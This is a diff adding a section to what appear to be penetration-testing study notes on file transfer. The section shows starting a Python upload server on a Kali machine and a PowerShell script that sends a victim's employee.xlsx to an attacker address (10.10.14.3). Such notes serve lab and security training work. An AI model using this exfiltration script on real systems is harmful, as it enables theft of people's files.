@@ -250,6 +250,37 @@ We can use the FTP client or **PowerShell Net.WebClient** to download files from
 
 ## Upload from Windows
 
+### With PSUpload + NewObject
+
+In our kali start an uploadserver:
+
+```
+python -m uploadserver
+```
+
+Now in the Windows machine, the target one that has a file that I need to upload to my kali (and all the other methods did not work):
+
+```
+# The file is employee.xlsx
+
+$FilePath = "C:\Users\theuser\Desktop\employee.xlsx"
+$Url = "http://10.10.14.3:8000/upload"
+
+Add-Type -AssemblyName System.Net.Http
+
+$client = New-Object System.Net.Http.HttpClient
+$content = New-Object System.Net.Http.MultipartFormDataContent
+$fileStream = [System.IO.File]::OpenRead($FilePath)
+$filename = [System.IO.Path]::GetFileName($FilePath)
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$content.Add($fileContent, "files", $filename)
+
+$response = $client.PostAsync($Url, $content).Result
+$response.StatusCode
+
+```
+
+
 ### PowerShell Base64 Encode & Decode
 
 **Upload  from Windows (victim) to  linux (attacker)** 
